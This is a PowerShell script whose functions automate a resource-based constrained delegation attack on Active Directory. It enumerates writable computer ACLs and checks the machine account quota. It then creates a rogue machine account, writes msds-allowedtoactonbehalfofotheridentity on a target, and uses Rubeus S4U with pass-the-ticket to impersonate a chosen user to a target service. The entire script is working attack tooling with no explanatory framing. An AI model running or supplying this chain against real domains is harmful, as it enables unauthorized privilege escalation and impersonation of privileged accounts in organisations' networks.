

function RBCD-Get-ACL {
    Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
}

function RBCD-Get-Quota {

    Param(
        [parameter(Mandatory=$true)]
        [String] $domain
    )

    Get-DomainObject -Identity $domain -Properties ms-DS-MachineAccountQuota

}

function RBCD-New-Computer {

    Param(
        [parameter(Mandatory=$true)]
        [String] $password,
        [parameter(Mandatory=$true)]
        [String] $newcomputername
    )

    New-MachineAccount -MachineAccount $newcomputername -Password $(ConvertTo-SecureString $password -AsPlainText -Force)
    Get-DomainComputer -Identity $newcomputername

}


function RBCD-Craft {

    Param(
        [parameter(Mandatory=$true)]
        [String] $computername,
        [parameter(Mandatory=$true)]
        [String] $newcomputername
    )

    $sid =Get-DomainComputer -Identity $newcomputername -Properties objectsid | Select -Expand objectsid
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
    $SDbytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDbytes,0)
    Get-DomainComputer -Identity $computername | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
}

function RBCD-Verify {
    Param(
        [parameter(Mandatory=$true)]
        [String] $computername
    )

    $RBCDbytes = Get-DomainComputer $computername -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
    $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
    $mysid = $Descriptor.DiscretionaryAcl | select SecurityIdentifier
    ConvertFrom-SID $mysid.SecurityIdentifier
}

function RBCD-GetHash {
    Param(
        [parameter(Mandatory=$true)]
        [String] $password
    )

    $out = Invoke-Rubeus "hash /password:$password" 
    $out = $out.Split([Environment]::NewLine)
    $out | Where-Object {$_ -match 'rc4_hmac'} | ForEach-Object {
        $outarray = $_.Split()
        $outarray[-1]
    }
}

function RBCD-Attack {
    Param(
        [parameter(Mandatory=$true)]
        [String] $password,
        [parameter(Mandatory=$true)]
        [String] $targetspn,
        [parameter(Mandatory=$true)]
        [String] $targetusername,
        [parameter(Mandatory=$true)]
        [String] $newcomputername

    )

    $hash = RBCD-GetHash -password $password
    Invoke-Rubeus "s4u /user:$newcomputername$ /rc4:$hash /impersonateuser:$targetusername /msdsspn:$targetspn /ptt"

}



function RBCD-Auto {
    Param(
        [parameter(Mandatory=$true)]
        [String] $password,
        [parameter(Mandatory=$true)]
        [String] $targetspn,
        [parameter(Mandatory=$true)]
        [String] $targetusername,
        [parameter(Mandatory=$true)]
        [String] $newcomputername,
        [parameter(Mandatory=$true)]
        [String] $targetcomputer

    )

    RBCD-New-Computer -newcomputername $newcomputername -password $password
    RBCD-Craft -computername $targetcomputer -newcomputername $newcomputername
    RBCD-Attack -newcomputername $newcomputername -password $password -targetspn $targetspn -targetusername $targetusername

}
